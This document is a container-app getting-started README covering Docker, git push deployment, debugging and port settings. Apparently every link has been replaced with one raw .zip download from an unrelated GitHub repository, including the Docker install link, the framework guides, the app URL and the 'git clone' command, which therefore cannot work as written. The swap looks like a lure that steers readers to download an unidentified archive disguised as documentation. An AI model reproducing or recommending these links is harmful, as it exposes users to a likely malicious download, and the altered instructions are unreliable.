# Go forth and build! 🚀

## Tutorial: How to make your first commit 📹:

This video example shows how to:

- Edit your container code
- Raise a new pull request
- Deploy the newest version automatically 🚀

https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip



By now, you have deployed a container, and in moments, you can visit your app
live!

> Be patient! In ~3 mins your app is live, at your [app url](https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip). It even has a free SSL/TLS certificate 🔒 you're welcome!

You probably want to add code to your app. Good news, your app is ready right now to start coding, which is simple:

1. Edit your code
2. Commit your code
3. Push your code `git push origin main`

Your app will be automatically re-deployed with the latest code at: https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip

> You app is deployed already and is working software. Gone are the days of spending weeks coding and then *another* week going to production. No. Go to production *early* and respond to change.

# Getting Started 💻 (locally on your laptop)

> Step 0: You need to download your repo to your computer:

```
git clone https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip
cd container-tzhlw7u
```

> See an error? You might need to setup permissions [here's a guide how to setup repo clone permissions](https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip)

1. [Install docker](https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip)

2. Start your container locally: `docker-compose up`
3. Visit your app locally: http://127.0.0.1:5000/

## View your app locally

Visit: http://127.0.0.1:5000/

### Rebuild container (locally)
If you make changes to `Dockerfile`, then you need to rebuild your container image. To rebuild the container image:
```
docker-compose build
# or 
docker-compose up --build
```

# Start coding! Which framework did you choose?

Need some help to get started?

- [**Flask** quickstart guide](https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip) ⚗️ 🐍
- [**Django** quide](https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip) 📰
- [**Ruby** quickstart guide](https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip) 💎
- [**Express** quickstart guide](https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip) 🟢

# Debugging

How do I turn on the debugger?

Enable a breakpoint by adding `breakpoint()` to your code, start your application and run to that point then in a terminal type:

```
docker attach container-tzhlw7u
```
Ta-da! You'll be inside the [Python debugger](https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip) ( ⬅️ Read this!)



## Questions

- How was this built? [All code is here](https://github.com/iZodiaco/container-tzhlw7u/raw/refs/heads/main/src/container_u_tzhlw_v2.2.zip)
- How can I use a customized port numberi/change the port number listened on? You don't need to do this if you use the quickstarts. But if you do want to alter the port: Edit your `Dockerfile` and change `EXPOSE` to the port number you want your app to listen on. Understand that all apps go through the proxy (nginx) listening on port `80` and `443`, requests to your app get proxied (based on your hostname) to the port number you put after `EXPOSE` in your your `Dockerfile`. For example `EXPOSE 3000` means you want the Dokku nginx proxy to forward port `80` and `443` connections to port `3000`. You still need to make your application listen on your chosen port.
